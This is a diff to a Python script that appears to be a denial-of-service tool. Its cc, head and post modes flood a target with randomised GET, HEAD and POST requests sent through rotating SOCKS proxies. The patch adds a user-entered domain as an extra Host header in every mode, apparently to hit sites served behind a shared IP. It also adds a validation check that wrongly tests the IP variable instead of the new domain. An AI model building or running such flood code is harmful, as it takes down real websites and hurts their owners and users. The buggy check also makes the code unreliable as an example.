@@ -153,6 +153,7 @@ def cc(event,socks_type):
 	if cookies != "":
 		connection += "Cookies: "+str(cookies)+"\r\n"
 	accept = Choice(acceptall)
+	host = "host:"+domain+"\r\n"
 	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	proxy = Choice(proxies).strip().split(":")
@@ -173,7 +174,7 @@ def cc(event,socks_type):
 			try:
 				for _ in range(multiple):
 					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-					request = get_host + referer + useragent + accept + connection +"\r\n"
+					request = get_host + referer + host + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
 			except:
 				s.close()
@@ -186,6 +187,7 @@ def head(event,socks_type):#HEAD MODE
 	if cookies != "":
 		connection += "Cookies: "+str(cookies)+"\r\n"
 	accept = Choice(acceptall)
+	host = "host:"+domain+"\r\n"
 	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	proxy = Choice(proxies).strip().split(":")
@@ -206,7 +208,7 @@ def head(event,socks_type):#HEAD MODE
 			try:
 				for _ in range(multiple):
 					head_host = "HEAD " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-					request = head_host + referer + useragent + accept + connection +"\r\n"
+					request = head_host + referer + host + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
 			except:
 				s.close()
@@ -219,6 +221,7 @@ def post(event,socks_type):
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
+	host = "host:"+domain+"\r\n"
 	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = Choice(acceptall)
 	if mode2 != "y":
@@ -226,7 +229,7 @@ def post(event,socks_type):
 	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 	if cookies != "":
 		length += "Cookies: "+str(cookies)+"\r\n"
-	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+	request = post_host + accept + host + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -449,6 +452,7 @@ def downloadsocks(choice):
 
 def main():
 	global ip
+	global domain
 	global url2
 	global port
 	global proxies
@@ -473,6 +477,10 @@ def main():
 	ip = str(input("> Host/Ip:"))
 	if ip == "":
 		print("> Plese enter correct host or ip")
+		sys.exit(1)
+	domain = str(input("> Domain:"))
+	if ip == "":
+		print("> Plese enter correct domain name")
 		sys.exit(1)
 	if mode == "slow" or mode == "check":
 		pass
